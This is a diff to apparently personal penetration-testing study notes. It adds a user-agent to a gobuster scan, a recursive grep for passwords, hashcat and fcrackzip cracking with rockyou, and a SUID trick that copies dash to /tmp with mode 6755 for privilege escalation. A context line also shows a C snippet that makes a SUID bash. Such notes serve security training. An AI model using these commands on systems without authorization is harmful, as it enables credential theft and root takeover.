@@ -131,7 +131,7 @@ take a big one and remove "manual"
 
 *gobuster*
 
-    gobuster dir -u <ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt -t 30
+    gobuster dir -u <ip> -a 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt -t 30
 
     -ip in format http://domain.com:5000 
     -t threads
@@ -264,6 +264,11 @@ Staged:
     
 exploit maybe leads to success
 If it fails first try is the payload, then maybe it is the port. 
+
+*Search for Passwords*
+
+    grep -Ri password .
+
 
 **DNS Enumeration**
 
@@ -1501,7 +1506,7 @@ If you find this error from Linux: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock 
 With the has use Hashcat for cracking.
 https://hashcat.net/wiki/doku.php?id=example_hashes
 
-    hashcat -m <mode> cred.txt /usr/share/wordlists/rockyou.txt 
+    hashcat -m <mode> cred.txt /usr/share/wordlists/rockyou.txt -O
 
 login into the new account
 
@@ -1552,6 +1557,14 @@ Good to export that to a different machine with a strong GPU (Tower)
 https://hashcat.net/hashcat/ 
 https://resources.infosecinstitute.com/hashcat-tutorial-beginners/ 
 
+*Crack zip password*
+
+    fcrackzip -D -p /usr/share/wordlists/rockyou.txt file.zip
+
+**File Analysis**
+
+    save as unknown
+    file unknown
 
 **Pivoting**
 
@@ -1631,6 +1644,14 @@ Replace it with C script
     void inject() {
         system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
     }
+
+*Escalate with SUID Bit*./
+
+Dash doesn't lose the SUID Bit
+
+    cp /bin/dash /tmp/ippsec3; chmod 6755 /tmp/ippsec3; /bin/dash;
+    6 is for users and group 
+
 
 Compile with
 
@@ -1789,7 +1810,6 @@ https://www.reddit.com/r/oscp/
 Use custom key file for ssh
 
     ssh root@ip -i privKey.pem
-
 
 
 
